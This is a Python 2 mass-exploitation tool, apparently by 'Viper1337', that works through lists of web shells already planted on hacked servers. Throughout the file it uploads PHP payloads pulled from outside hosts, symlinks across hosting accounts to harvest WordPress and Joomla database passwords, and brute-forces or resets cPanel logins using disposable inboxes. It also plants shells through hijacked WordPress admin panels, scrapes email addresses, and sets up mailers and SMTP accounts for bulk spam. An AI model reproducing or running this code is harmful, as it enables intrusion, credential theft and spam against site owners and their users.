import smtplib
from http_request_randomizer.requests.proxy.requestProxy import RequestProxy

import requests, random, string, re, time, urlparse
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer
from colorama import *
from time import strftime

init(autoreset=True)

fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA
fy = Fore.YELLOW
# Viper1337

headers = {'Connection': 'keep-alive',
           'Cache-Control': 'max-age=0',
           'Upgrade-Insecure-Requests': '1',
           'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
           'Accept-Encoding': 'gzip, deflate',
           'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8'}


def checkupdate():
    check = requests.get("https://www.mrspy.com/news.txt").content
    print "Your Current Version is 2 \n Avaible Version :" + check + "Contact Viper1337 To get Update"


def ran(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))


def file_get_contents(filename):
    with open(filename) as f:
        return f.read()


def upload(shell, file):
    global path
    try:
        filename = ran(10) + '.php'
        s1 = shell
        while '/' in s1:
            s1 = s1[s1.index("/") + len("/"):]
        path = shell.replace(s1, filename)
        filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'UTF-8'}
        fileup = {'f': (filename, file)}
        upFile = requests.post(shell, data=filedata, files=fileup, headers=headers, timeout=20)
        return path
    except:
        print fr+'[-]Upl0d Failed ! ' + shell +fw


def uploadfile(shell, fileSrc):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        checklive = requests.get(shell).content
        if 'Uname:' in checklive:
            print fy+'(*) Shell Working Uploading ...'+fw
            upload(shell, fileSrc)
            print fg+'[+] Done -> ' + path+fw
        else:
            print fr+'[-] Shell Dead ' + shell+fw
    except:
        pass


def symlink(shell):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        # check if vhosts or not
        check = requests.get(shell, timeout=7)
        if '/vhosts/' in check.content:
            file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/vhosts.php').content
            upload(shell, file)
            check2 = requests.get(path)
            st = path[:-14]
            vhos = st + "/SpyVhots/spyvhost.cin"
            homereq = requests.get(vhos)
            vhoss = st + "/SpyVhots/"
            homereqq = requests.get(vhos)
            if '.txt' in homereqq.content and (' 0k' not in homereqq.content):
                open("count.txt", "w").write(homereqq.content)
                with open("count.txt") as f:
                    contents = f.read()
                    count = contents.count(".txt")
                    final = count / 2
                    print fg+'[+] '+str(final) + " Configs Found in The Server " + vhoss
                    open("Result/Symlinked.txt", "a").write(str(final) + " " + vhoss)
            else:
                print '[-] Config Not Found  -- > ' + vhoss
        elif '/home/' or '/home2/' or 'public_html' in check.content:
            file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/config.php').content
            upload(shell, file)
            check2 = requests.get(path)
            st = path[:-14]
            home = st + "/home/"
            homereq = requests.get(home)
            if ('.txt' in homereq.content) and (' 0k' not in homereq.content):
                open("count.txt", "w").write(homereq.content)
                with open("count.txt") as f:
                    contents = f.read()
                    count = contents.count(".txt")
                    final = count / 2
                    print fg+'[+] '+str(final) + " Configs Found in The Server " + home+fw
                    open("Result/Symlinked.txt", "a").write(str(final) + " " + home)
            else:
                print fy+'[-] Config Not Found  -- > ' + home +fw
        else:
            print fr+'[-] No Config Found ' + shell+fw
    except:
        pass


def uploadmailer(shell):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/leaf.php').content
        upload(shell, file)
        leaf = requests.get(path).content
        # let's check if found mailer
        if 'Leaf PHPMailer' in leaf:
            print fg+'[+] Mailer Upload Successfully -> ' + path+fw
            open("Result/LeafMailer.txt", "a").write(path+'\n')
        else:
            print fr+'Failed To Upload --> ' + shell+fw
    except:
        pass


def creatsmtp(shell):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        checklive = requests.get(shell).content
        if 'Uname:' in checklive:
            print '(*) Trying To Create Smtp ' + shell
            file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/smtp.php').content
            upload(shell, file)
            a = requests.get(path).content
            smtpC = re.findall(re.compile(
                '<smtp>(.*)</smtp>'),
                a)[0]
            # let's check if found smtp
            if 'spyv2' and '|' in smtpC:
                print fg+'[+] Created With Sucess -> ' + smtpC +fw
                open("Result/Smtps.txt", "a").write(smtpC + '\n')
            else:
                print fr+'(-) No Smtp Found' +fw
        else:
            print fr+'[-] Shell Dead ' + shell+fw
    except:
        pass


def grabbMail(shell):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/mail.php').content
        upload(shell, file)
        a = requests.get(path).content
        if 'Mailst By D3F4ULT' in a:
            st = path[:-14]
            rz = st + "/list.txt"
            result = requests.get(rz).content
            if '@gmail' in result:
                open("count2.txt", "w").write(result)
                open("Result/emails.", "a").write(result + '\n')
                with open("count2.txt") as f:
                    contents = f.read()
                    count = contents.count("@")
                print '[+] Found ' + str(count) + ' Emails -> ' + shell
                print result
            else:
                print fy+'[-] No Email Found ' + path+fw
        else:
            print fr+'[-] Shells Not Working ' + shell+fw
    except:
        pass


def acceshas(shell):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/acceshash.php').content
        upload(shell, file)
        data = {'go': 'Check'}
        taz = requests.post(path, data=data)
        smtpC = re.findall(re.compile(
            'Total Hash Found =(.*)<br>'),
            taz.content)[0]
        if int(smtpC) > 0:
            print fg+'[+] Found ' + path+fw
            open("Result/AccesHash.txt", "a").write(path+'\n')
        else:
            print fy+'[-] No AccessHash ' + shell+fw
    except:
        pass


def checkshell(shell):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        checkshell = requests.get(shell).content
        if 'Uname:' in checkshell:
            print fg+'[+] Shell Work ' + shell +fw
        else:
            print fr+'[-] Dead ' + shell +fw
    except:
        pass


def changemail():
    session = requests.session()
    payload = {"f": "get_email_address"}
    r = session.get("http://api.guerrillamail.com/ajax.php", params=payload)
    email = r.json()["email_addr"]
    return email, session.cookies


def checkinbox(cookies, user):
    # try:
    kk = 'fuck'
    cookies = {"PHPSESSID": cookies}
    session = requests.session()
    payload = {"f": "set_email_user", "email_user": user, "lang": "en"}
    r = session.get("http://api.guerrillamail.com/ajax.php", params=payload, cookies=cookies)
    payload = {"f": "check_email", "seq": "1"}
    r = session.get("http://api.guerrillamail.com/ajax.php", params=payload, cookies=cookies)
    for email in r.json()["list"]:
        if 'cpanel' in email["mail_from"]:
            email_id = email["mail_id"]
            payload = {"f": "fetch_email", "email_id": email_id}
            r = session.get("http://api.guerrillamail.com/ajax.php", params=payload, cookies=cookies)
            kk = r.json()['mail_body'].split(
                '<p style="border:1px solid;margin:8px;padding:4px;font-size:16px;width:250px;font-weight:bold;">')[
                1].split('</p>')[0]
            payload = {"f": "del_email", "email_ids[]": int(email_id)}
            r = session.get("http://api.guerrillamail.com/ajax.php", params=payload, cookies=cookies)
        else:
            kk = 'fuck'
    return kk


def resetPassword(shell):
    try:
        # Remember To Creat Function To Check What Protocol Using Site ,
        shell = shell.replace('\n', '').replace('\r', '')
        checkiflive = requests.get(shell).content
        if 'Uname:' in checkiflive:
            print '(*) Shell Is Working ..\n |__>' + shell
            urr = shell.split('/')
            cpanel1 = 'http://' + urr[2] + ':2082'
            cpanel2 = 'https://' + urr[2] + ':2083'
            cp1 = requests.get(cpanel1, timeout=7).content
            cp2 = requests.get(cpanel2, timeout=7).content
            if ('Reset Password' in cp1) or ('Reset Password' in cp2):
                print fy+'[+] Reset Password Avaible In ' + shell+fy
                file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/reset.php').content
                upload(shell, file)
                src = str(changemail())
                email = re.findall(re.compile('u\'(.*)\', <RequestsCookieJar'), src)[0]
                cookies = re.findall(re.compile('name=\'PHPSESSID\', value=\'(.*)\', port='), src)[0]
                post1 = {'email': email, 'get': 'get'}
                check = requests.post(path, data=post1, headers=headers,
                                      timeout=15).content
                time.sleep(10)
                code = checkinbox(cookies, email)
                start = timer()
                while ((code == 'fuck') and ((timer() - start) < 90)):
                    time.sleep(5)
                    code = checkinbox(cookies, email)
                if (code == 'fuck'):
                    print fr+' [-] Mail Not Recived Try Manulle '+fw
                    open("Result/RestedCpsFailed.txt", "a").write(path + '\n')
                    pass
                else:
                    print fg+'(*)Your Code Is : ' +fm+ code+fy
                    post2 = {'code': code, 'get2': 'get2'}
                    check2 = requests.post(path, data=post2, headers=headers,
                                           timeout=15).content
                    if '<cpanel>' in check2:
                        cpanelRt = re.findall(re.compile('<cpanel>(.*)</cpanel>'), check2)[0]
                        print fg+'[+] Succeeded => ' + cpanelRt+fw
                        open("Result/RestedCps.txt", "a").write(cpanelRt + '\n')
                    else:
                        print fr+'|_> Reset Password Failed '+fw
            else:
                print '[-] Reset Not available ... ' + shell

        else:
            print fr+'[-] Shell Not Live ... ' + shell+fw
    except:
        pass


def checkmail(shell):
    try:
        getSession = requests.session()
        sessionMail = getSession.get("https://tempmail.net")
        workMail = re.findall('class="adres-input" value="(.*?)" readonly>', sessionMail.content)
        workMail = workMail[0]

        file = """
                           <?php
                                   if(function_exists("mail")) {
                                           mail('""" + workMail + """', 'viper1337', 'Mail Working!');
                                           echo 'sent!';
                                   } else {
                                           echo 'MailFunctionNotWork';
                                   }
                           ?>
                   """
        shell = shell.replace('\n', '').replace('\r', '')
        upload(shell, file)
        get = requests.get(path).content
        if "sent!" in get:
            print "[+] " + shell + " ==> Mail Sent Let Me Check Deliver"
            maincodeurl = None
            count = 0
            while maincodeurl is None:
                getcodeurl = getSession.get("https://tempmail.net")
                sexy = re.findall('<li class="mail " id="mail_(.*?)">', getcodeurl.content)
                if sexy:
                    maincodeurl = sexy
                count += 1
                if count > 100:
                    maincodeurl = []
            if maincodeurl == []:
                print fr+"[-] " + shell + " ==> Mail doesn't works or too late "+fw
            else:
                print fg+"[+] " + shell + " ==> Mail Recived "+fw
                open('mail_works.txt', 'a').write(shell + "\n")
        else:
            print fm+"[-] " + shell + " ==> Mail function Disabled"+fy


    except:
        pass


####################### cp brute shells #################

def grab_users(path):
    cookies = {
        'OCSESSID': 'bd7f42c6f29b3885ee2746f72d',
        'language': 'en-gb',
        'currency': 'USD',
        'timezone': 'Africa/Lagos',
        'PHPSESSID': 't71r8l1hseq3o16f1c8bbgf2r2',
    }

    data = {
        'usre': 'Get Usernames & Config !'
    }

    r = requests.post(path, headers=headers, cookies=cookies, data=data).text
    return r.split('<textarea rows=10 cols=30 name=user>')[1].split('</textarea><br><br>')[0]


def crack_cp(path, users, passwds):
    url = path.split('/')
    cp = 'http://' + url[2] + '/cpanel|'
    cookies = {
        'OCSESSID': 'bd7f42c6f29b3885ee2746f72d',
        'language': 'en-gb',
        'currency': 'USD',
        'timezone': 'Africa/Lagos',
        'PHPSESSID': 't71r8l1hseq3o16f1c8bbgf2r2',
    }

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://toys.lavjen.com',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Referer': path,
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    data = {
        'page': 'find',
        'usernames': users,
        'passwords': passwds,
        'type': 'simple'
    }

    r = requests.post(path, headers=headers, cookies=cookies, data=data)
    cps = r.text.split('You Found <font color=green>')[1].split('</font>')[0]
    print fg+'[+] You Found ' + cps + ' Cpanles '+fr
    cpanles = re.findall(re.compile('<cpanel>(.*)</cpanel><br />'), r.content)[0]
    open('Result/crackcp.txt', 'a').write(cp + cpanles + '\n')


def cprbuteforce(shell):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        checkifshellhomepath = requests.get(shell, timeout=7).content
        if ('/home/' or '/home2/' or '/public_html/' in checkifshellhomepath) and ('Uname:' in checkifshellhomepath):
            print '|_> Shell Is Working  ....  ' + shell
            # Config First
            file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/config.php').content
            upload(shell, file)
            check2 = requests.get(path)
            st = path[:-14]
            home = st + "/home/"
            homereq = requests.get(home)
            if '.txt' in homereq.content and (' 0k' not in homereq.content):
                print fg+'[+] Symlinked Done ' + path+fw
                file = requests.get(
                    'https://raw.githubusercontent.com/MoetazBrayek/Python/master/spybruter.php').content
                upload(shell, file)
                get = requests.get(path).content
                if 'MisterSpyV2Bruter' in get:
                    print fy+'(*)lets Grabb Users ..|_*'+fw
                    users = grab_users(path)
                    print users
                    cName = re.findall('<a href="(.*?)">', homereq.content)
                    configs = []
                    for i in cName:
                        configs.append(home + '/' + i)
                    passw = ""
                    print fy+'(*) Lets Grabb Password .....'+fw
                    for i in configs:
                        if 'WORDPRESS' in i:
                            r = requests.get(i)
                            uu = re.findall("define\('DB_PASSWORD', '(.*?)'\);", r.content)
                            aa = ''.join(uu)
                            passw += aa + '\r\n'
                            print uu
                        elif 'JOOMLA' in i:
                            r = requests.get(i)
                            uu = re.findall("public \$password = '(.*?)';", r.content)
                            zz = ''.join(uu)
                            passw += zz + '\r\n'
                            print uu
                    print fm+'(*)Now Lets Crack ....|_>'+fw
                    crack_cp(path, users, passw)
                else:
                    print fr+'[-] Uploade Failed ' + shell+fw

            else:
                print fy+'|_> No Config In ' + shell+fw

        else:
            print '(-) Symlink Not Available '+shell

    except:
        pass


def wpmass(shell):
    try:
        shell = shell.replace('\n', '').replace('\r', '')
        checkifshellhomepath = requests.get(shell, timeout=7).content
        if ('/home/' or '/home2/' or '/public_html/' in checkifshellhomepath) and ('Uname:' in checkifshellhomepath):
            file = requests.get('https://raw.githubusercontent.com/MoetazBrayek/Python/master/wpmass.php').content
            upload(shell, file)
            get = requests.get(path).content
            if 'spyv2@12' in get:
                count = 0
                urls = get.split("<br>")
                for link in urls:
                    if link != "":
                        count += 1
                        print link
                    else:
                        print ''
                print fg+"[+] " + shell + " ==> Total Wordpress --> " + str(count) + ":D"+fw
            else:
                print '[-] No Wordpress Avaible ' + shell
        else:
            print fr+'[-] Unknow Type of Shell ' + shell+fw

    except:
        pass


def massupwp(url):
    try:

        lib = requests.session()
        site, user, passwd = url.split("|")
        get = lib.get(site, timeout=10)
        submit = re.findall(
            '<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="(.*)" />',
            get.content)
        submit = submit[0]
        redirect = re.findall('<input type="hidden" name="redirect_to" value="(.*?)" />', get.content)
        redirect = redirect[0]
        Login = {'log': user,
                 'pwd': passwd,
                 'wp-submit': submit,
                 'redirect_to': redirect,
                 'testcookie': '1'}
        req = lib.post(site, data=Login, timeout=20)
        currurl = site.replace("/wp-login.php", "")
        if 'dashboard' in req.content:

            print 'Login Succes Lets Upload Shell ...' + site
            req = lib.post(site, data=Login, timeout=20)
            new3 = currurl + "/wp-admin/plugin-install.php?tab=upload"
            getdata = lib.get(new3, timeout=20, allow_redirects=False).content
            if '_wpnonce' and 'install-plugin-submit' in getdata:
                wponce = re.findall('id="_wpnonce" name="_wpnonce" value="(.*?)"', getdata)
                valueplugin = re.findall('id="install-plugin-submit" class="button" value="(.*?)"', getdata)
                zip = "ubb.zip"
                Data = {
                    '_wpnonce': wponce[0],
                    '_wp_http_referer': currurl + '/wp-admin/plugin-install.php?tab=upload',
                    'install-plugin-submit': valueplugin[0]
                }
                Data2 = {'pluginzip': (zip, open(zip, 'rb'), 'multipart/form-data')}
                go = lib.post(currurl + '/wp-admin/update.php?action=upload-plugin', data=Data, files=Data2)
                up = lib.post(currurl + '/wp-admin/update.php?action=upload-plugin', files=Data2)
                shell = lib.get(currurl + '/wp-content/plugins/ubb/index.php')
                if "Mister Spy UploaderWp" in shell.text:
                    print fg+"[+] " + currurl + '/wp-content/plugins/ubb/index.php' + " ==> Upload Success!"+fw
                    open('done_shell.txt', 'a').write(currurl + '/wp-content/plugins/ubb/index.php' + '\n')
                else:
                    print fy+"[-] " + currurl + " ==> Upload somehow failed! Maybe firewall?"+fw
            else:
                print fr+'Problem In Upload Page Not Loading ' + new3+fw
        else:
            print fy+"[-] " + currurl + " ==> Login failed or website down!"+fw
    except:
        pass


###############################################################################
# other tools
def spymailer(site, subject, fromname, data, mailer):
    try:
        site = site.replace('\n', '').replace('\r', '')
        post_data = {'to': site, 'subject': subject, 'fromname': fromname, 'message': data}
        r = requests.post(mailer, data=post_data)
        print '--------------------------'
        print 'To ===> ' + site
        print 'Subject ===> ' + subject
        print 'Name ===> ' + fromname
        print 'Mailer ===> ' + mailer
        print 'Status ===> {}Sent'.format(fg, fw)
        print '--------------------------'

    except:
        pass


def massgrab(ip):
    try:
        ip = ip.rstrip()
        req_proxy = RequestProxy()
        api = 'http://api.hackertarget.com/reverseiplookup/?q=' + ip
        while True:
            request = req_proxy.generate_proxied_request(api)
            if ((request is not None) and ('.com' in request.text)):
                print  '"""""""""""""""""""""\n' + request.text
                print  "IP Done==> " + ip + ""
                print '"""""""""""""""""""""\n'
                break

    except:
        pass


def massgrab2(i):
    try:
        req_proxy = RequestProxy()
        i = i.replace('\n', '').replace('\r', '')
        api = 'https://viewdns.info/reverseip/?host=' + i + '&t=1'
        while True:
            request = req_proxy.generate_proxied_request(api)
            if '.com' in request.text:
                mrspy = re.findall('</tr><tr> <td>(.*?)</td><td align="center">', request.text)
                for i in mrspy:
                    if i.startswith("http//"):
                        print 'http://' + i
                        open('Result/GrabbedVIEWDNS.txt', "a").write('http://' + i + "\n")
                    elif i.startswith("https//"):
                        print 'http://' + i
                        open('Result/GrabbedVIEWDNS.txt', "a").write('http://' + i + "\n")
                    else:
                        print 'http://' + i
                        open('Result/GrabbedVIEWDNS.txt', "a").write('http://' + i + "\n")
                break
    except:
        pass
        print 'Maybe Your Internet Too Bad Or Not Working Contact Viper1337'


def validmail(email):
    try:
        data = {"email": email}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24'}
        response = requests.post("https://verifyemailaddress.com/result", headers=headers, data=data).text
        if "is valid" in response:
            print fg+'(+) Email Valid ' + email+fw
            open('Result/VerifiedEmail.txt', 'a').write(email + '\n')
        else:
            response = requests.post("https://www.infobyip.com/verifyemailaccount.php", headers=headers, data=data).text
            if "Email account exists." in response:
                print fg+'(+) Email Valid ' + email+fw
                open('Result/VerifiedEmail.txt', 'a').write(email + '\n')
            else:
                print '(-) Email Dead ' + email
    except:
        pass


def replacment(email, url, id):
    shell = url.replace('\n', '').replace('\r', '')
    check = requests.get(shell).content
    if 'Uname:' in check:
        file = requests.get('http://pastebin.com/raw/38uc79ZR').content
        upload(shell, file)
        post_data = {'email': email, 'orderid': id}
        taz = requests.post(url=path, data=post_data).content
        if 'send an report to' in taz:
            print 'Done Sending Check Ur Email \n Your File :' + path + ' \n Your Shell : ' + shell
        else:
            print 'Shell Not Sending ' + shell
    else:
        print 'Shell Not Working Or Not Supporting Get' + shell


def masssmtpchecker(url, address):
    ur = url.rstrip()
    ch = ur.split('\n')[0].split('|')
    serveraddr = ch[0]
    toaddr = address
    fromaddr = ch[2]
    serverport = ch[1]
    SMTP_USER = ch[2]
    SMTP_PASS = ch[3]
    now = strftime("%Y-%m-%d %H:%M:%S")
    msg = "From: %s\r\nTo: %s\r\nSubject: Test Message from smtptest at %s\r\n\r\nTest message from the smtptest tool sent at %s" % (
        fromaddr, toaddr, now, now)
    server = smtplib.SMTP()
    try:
        server.connect(serveraddr, serverport)
        server.login(SMTP_USER, SMTP_PASS)
        server.sendmail(fromaddr, toaddr, msg)
        print fg+"(*) Working ===> " + ur+fw
        open('Result/ValidSmtp.txt', 'a').write(url + "\n")
        server.quit()
    except:
        print fr+"[-] FAILED ===> " + ur+fw
        pass


################################################################################
# cp tools
def cpcheck(url):
    try:
        domain, username, pwd = url.split("|")
        lib = requests.Session()
        host = domain + "/login/?login_only=1"
        log = {'user': username, 'pass': pwd}
        req = lib.post(host, data=log, timeout=5)
        if 'security_token' in req.content:
            print("[+] " + domain + " ==> Login Successful!")
            open('cp_loginok.txt', 'a').write(url + "\n")
        else:
            print("[-] " + domain + " ==> Login Invalid!")
    except:
        pass


def cpfileupload(url, filename):
    ur = url.rstrip()
    site = ur.split('|')[0]
    user = ur.split('|')[1]
    passw = ur.split('|')[2]
    try:
        cookies = {
            'timezone': 'Africa/Lagos',
        }

        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36',
            'Content-type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Connection': 'keep-alive',
        }

        params = (
            ('login_only', '1'),
        )

        data = {
            'user': user,
            'pass': passw,
            'goto_uri': '/'
        }

        s = requests.session()
        r = s.post(site + '/login/', headers=headers, params=params, data=data)
        sec = r.json()['security_token']
        r1 = s.get(site + sec + '/execute/Resellers/list_accounts', headers=headers, cookies=s.cookies)
        k = r1.json()['data']
        for kk in k:
            dom = kk['domain']

        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryIZRb4yJgzq77q7sI',
            'Accept': '*/*',
            'Connection': 'keep-alive',
        }

        ur = site + sec + "/json-api/cpanel"
        file = {
            'file-0': open(filename, 'rb'),
        }
        res = requests.post(
            url=ur,
            data={'cpanel_jsonapi_module': 'Fileman', 'cpanel_jsonapi_func': 'uploadfiles',
                  'cpanel_jsonapi_apiversion': '2', 'getdiskinfo': '1', 'permissions': '0644', 'cpanel-trackupload': '',
                  'dir': '/home/' + user + '/public_html', 'overwrite:': '0'}
            , files=file, headers=headers, cookies=s.cookies)
        cpups = 'http://' + dom + '/' + filename
        open('Result/uploadedfromcp.txt', 'a').write('http://' + dom + '/' + filename + "\n")
        print cpups + '{} [+]{}Success '.format(fg, fw)
    except:
        print url + '{} [+]{}Failed '.format(fr, fw)
        pass


#################################################################################

def main():
    Banner = """
  ______                      _       _     ____            _      __      __  __   _  _   
 |___  /                     | |     (_)   |  _ \          | |     \ \    / / /_ | | || |  
    / /    ___    _ __ ___   | |__    _    | |_) |   ___   | |_     \ \  / /   | | | || |_ 
   / /    / _ \  | '_ ` _ \  | '_ \  | |   |  _ <   / _ \  | __|     \ \/ /    | | |__   _|
  / /__  | (_) | | | | | | | | |_) | | |   | |_) | | (_) | | |_       \  /     | |    | |  
 /_____|  \___/  |_| |_| |_| |_.__/  |_|   |____/   \___/   \__|       \/      |_|    |_|  
                                                                                                                                                                                      
             ICQ: @viper1337official
    """
    print fy + Banner + fw
    print "{}[{}1{}] {}  Mass Symlink Shells                               ".format(fr, fg, fr, fw)
    print "{}[{}2{}] {}  Mass Create Smtp From Shells                      ".format(fr, fg, fr, fw)
    print "{}[{}3{}] {}  Mass Extract Emails From Shells                     ".format(fr, fg, fr, fw)
    print "{}[{}4{}] {}  Mass Upload Mailers From Shells                   ".format(fr, fg, fr, fw)
    print "{}[{}5{}] {}  Mass Check Working Shells                        ".format(fr, fg, fr, fw)
    print "{}[{}6{}] {}  Mass Cp Rest From Shells                          ".format(fr, fg, fr, fw)
    print "{}[{}7{}] {}  Mass Mail Check From Shells                     ".format(fr, fg, fr, fw)
    print "{}[{}8{}] {}  Mass Find Access Hash From Shells                ".format(fr, fg, fr, fw)
    print "{}[{}9{}] {}  Mass Find Cpanel  From Shells                    ".format(fr, fg, fr, fw)
    print "{}[{}10{}] {} Mass File Upload From Shells [Random]            ".format(fr, fg, fr, fw)
    print "{}[{}11{}] {} Mass Symlink & Brute Force Cpanel From Shells   ".format(fr, fg, fr, fw)
    print "{}[{}12{}] {} Mass Wordpress Pass Change From Shells           ".format(fr, fg, fr, fw)
    print "{}[{}13{}] {} Mass Shell Upload In Wordpress Panel             ".format(fr, fg, fr, fw)
    print "{}[{}14{}] {} Shell Replacement  T-Shop/Olux/Xleet                ".format(fr, fg, fr, fw)
    print "{}[{}15{}] {} Mass Cpanel Checker                              ".format(fr, fg, fr, fw)
    print "{}[{}16{}] {} Mass Cpanel Upload File                          ".format(fr, fg, fr, fw)
    print "{}[{}17{}] {} Mass Email Bounced Checker                       ".format(fr, fg, fr, fw)
    print "{}[{}18{}] {} Mass Smtp Checker                                ".format(fr, fg, fr, fw)
    print "{}[{}19{}] {} Mass Grab Sites ViewDns/HackTarget               ".format(fr, fg, fr, fw)
    print "{}[{}20{}] {} Mass Viper1337 Sender                              ".format(fr, fg, fr, fw)
    print "{}[{}21{}] {} Check Update                                     ".format(fr, fg, fr, fw)

    choice = raw_input('\nEnter Ur Choice : ')

    if choice == '1':
        try:
            listshell = raw_input("[+] Enter Shell list: ")
            try:
                with open(listshell, 'r') as get:
                    read = get.read().splitlines()
            except IOError:
                pass
            read = list((read))
            try:
                pp = ThreadPool(processes=5)
                pr = pp.map(symlink, read)
            except:
                pass
        except:
            pass
    elif choice == '2':
        lists = raw_input('Your List: ')
        with open(lists) as f:
            for shell in f:
                creatsmtp(shell)
    elif choice == '3':
        lists = raw_input('Your List: ')
        with open(lists) as f:
            for shell in f:
                grabbMail(shell)
    elif choice == '4':
        lists = raw_input('Your List: ')
        with open(lists) as f:
            for shell in f:
                uploadmailer(shell)
    elif choice == '5':
        lists = raw_input('Your List: ')
        with open(lists) as f:
            for shell in f:
                checkshell(shell)
    elif choice == '6':
        liists = raw_input('Enter Your Shells :')
        with open(liists) as f:
            for shell in f:
                resetPassword(shell)
    elif choice == '7':
        liists = raw_input('Enter Your Shells :')
        with open(liists) as f:
            for shell in f:
                checkmail(shell)
    elif choice == '8':
        liists = raw_input('Enter Your Shells :')
        with open(liists) as f:
            for shell in f:
                acceshas(shell)
    elif choice == '9':
        liists = raw_input('Enter Your Shells :')
        with open(liists) as f:
            for shell in f:
                acceshas(shell)
    elif choice == '10':
        liists = raw_input('Enter Your Shells :')
        files = raw_input('Enter Your File Name :')
        fileSrc = file_get_contents(files)
        with open(liists) as f:
            for shell in f:
                uploadfile(shell, fileSrc)
    elif choice == '11':
        liists = raw_input('Enter Your Shells :')
        with open(liists) as f:
            for shell in f:
                cprbuteforce(shell)
    elif choice == '12':
        liists = raw_input('Enter Your Shells :')
        with open(liists) as f:
            for shell in f:
                wpmass(shell)
    elif choice == '13':
        liists = raw_input('Enter Your Logins :')
        with open(liists) as f:
            for url in f:
                massupwp(url)
    elif choice == '14':
        url = raw_input('Enter Your Shell :')
        email = raw_input('Enter Your Email :')
        id = raw_input('Report Id :')
        replacment(email, url, id)
    elif choice == '15':
        liists = raw_input('Enter Your List :')
        with open(liists) as f:
            for url in f:
                cpcheck(url)
    elif choice == '16':
        filename = raw_input('Filename : ')
        liists = raw_input('Enter Your List :')
        with open(liists) as f:
            for url in f:
                cpfileupload(url, filename)
    elif choice == '17':
        liists = raw_input('Enter Your List :')
        with open(liists) as f:
            for email in f:
                validmail(email)
    elif choice == '18':
        address = raw_input('Enter Your email :')
        liists = raw_input('Enter Your List :')
        with open(liists) as f:
            for url in f:
                masssmtpchecker(url, address)
    elif choice == '19':
        ch = raw_input('1-HackTarget Or 2-View :')
        if ch == '1':
            liists = raw_input('Ips :')
            with open(liists) as f:
                for ip in f:
                    massgrab(ip)
        elif ch == '2':
            liists = raw_input('Ips :')
            with open(liists) as f:
                for ip in f:
                    massgrab2(ip)
        else:
            print 'Wrong CHoice ... Exit'

    elif choice == '20':
        with open('letter.txt', 'r') as myfile:
            data = myfile.read()
        subject = raw_input('Subject :')
        fromname = raw_input('From :')
        zarwi = raw_input('emails.txt :')
        with open(zarwi) as f:
            for site in f:
                filename = open('mailers.txt', 'r')
                mailer = random.choice(open('mailers.txt').readlines())
                mailer = mailer.replace('\n', '').replace('\r', '')
                filename.close()
                spymailer(site, subject, fromname, data, mailer)
    elif choice == '21':
        update = requests.get('https://pastebin.com/raw/6X4KFK8U').content
        print update
    else:
        print 'Choice Wrong ... Run Again !'

if __name__ == '__main__':
    main()
    print 'Thank You For Using My Tool Join Us Viper1337'
